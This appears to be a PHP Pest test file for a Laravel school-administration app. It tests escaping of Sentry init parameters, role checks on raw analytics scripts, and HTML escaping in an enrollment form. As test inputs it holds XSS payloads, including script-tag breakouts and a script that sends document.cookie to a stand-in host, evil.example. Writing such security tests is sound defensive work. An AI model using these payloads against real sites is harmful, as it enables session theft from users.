<?php

declare(strict_types=1);

use App\Enums\UserRole;
use App\Models\GeneralSetting;
use App\Models\User;
use App\Services\GeneralSettingsService;
use App\Services\SentrySettingsService;
use Spatie\Permission\Models\Permission;

it('JSON-encodes Sentry browser init parameters with hex flags to prevent script-context breakout', function (): void {
    app(GeneralSettingsService::class)->replaceGlobalSettings(null);
    app(SentrySettingsService::class)->resetCache();
    GeneralSetting::factory()->create();

    $service = app(SentrySettingsService::class);
    $service->save([
        'enabled' => true,
        'dsn' => 'https://publickey@o123.ingest.sentry.io/456',
        'environment' => 'prod</script><script>alert(1)</script>',
        'release' => 'v1.0\\";alert(2);//',
        'sample_rate' => 1.0,
        'traces_sample_rate' => 0.2,
        'profiles_sample_rate' => null,
        'send_default_pii' => false,
        'enable_logs' => false,
        'frontend_enabled' => true,
        'frontend_dsn' => '',
        'frontend_script' => '',
        'frontend_traces_sample_rate' => 0.1,
        'frontend_replays_session_sample_rate' => 0.0,
        'frontend_replays_on_error_sample_rate' => 1.0,
    ]);

    $markup = $service->renderHeadMarkup();

    expect($markup)
        ->not->toContain('</script><script>alert(1)')
        ->toContain('\\u003C/script\\u003E')
        ->not->toContain('\\\\";alert(2)')
        ->toContain('https://publickey@o123.ingest.sentry.io/456');
});

it('forbids non-SuperAdmin/Developer users from saving raw analytics scripts', function (): void {
    GeneralSetting::factory()->create(['analytics_enabled' => true]);

    $admin = User::factory()->create(['role' => UserRole::Admin]);
    foreach (['View:SystemManagementAnalytics', 'Update:SystemManagementAnalytics'] as $permission) {
        Permission::firstOrCreate(['name' => $permission, 'guard_name' => 'web']);
    }
    $admin->givePermissionTo(['View:SystemManagementAnalytics', 'Update:SystemManagementAnalytics']);

    // Manual override script is forbidden for standard Admin
    $this->actingAs($admin)
        ->put(route('administrators.system-management.analytics.update'), [
            'analytics_enabled' => true,
            'providers' => [
                [
                    'provider' => 'umami',
                    'enabled' => true,
                    'script' => '<script>fetch("https://evil.example/?c="+document.cookie)</script>',
                    'settings' => [
                        'script_url' => 'https://umami.example.com/script.js',
                        'website_id' => 'site-1',
                    ],
                ],
            ],
        ])
        ->assertForbidden();

    // Custom raw HTML provider is also forbidden for standard Admin
    $this->actingAs($admin)
        ->put(route('administrators.system-management.analytics.update'), [
            'analytics_enabled' => true,
            'providers' => [
                [
                    'provider' => 'custom',
                    'enabled' => true,
                    'settings' => [
                        'snippet' => '<script>alert(1)</script>',
                    ],
                ],
            ],
        ])
        ->assertForbidden();

    // SuperAdmin is permitted to save raw analytics scripts
    $superAdmin = User::factory()->create(['role' => UserRole::SuperAdmin]);

    $this->actingAs($superAdmin)
        ->put(route('administrators.system-management.analytics.update'), [
            'analytics_enabled' => true,
            'providers' => [
                [
                    'provider' => 'umami',
                    'enabled' => true,
                    'script' => '<script>/* verified superadmin override */</script>',
                    'settings' => [
                        'script_url' => 'https://umami.example.com/script.js',
                        'website_id' => 'site-1',
                    ],
                ],
            ],
        ])
        ->assertRedirect();
});

it('escapes room, section, and subjectCode in StudentEnrollmentForm schedule preview HTML', function (): void {
    $source = (string) file_get_contents(app_path('Filament/Resources/StudentEnrollments/Schemas/StudentEnrollmentForm.php'));

    expect($source)
        ->toContain('e((string) $room)')
        ->toContain('e((string) $section)')
        ->toContain('e((string) $subjectCode)');
});
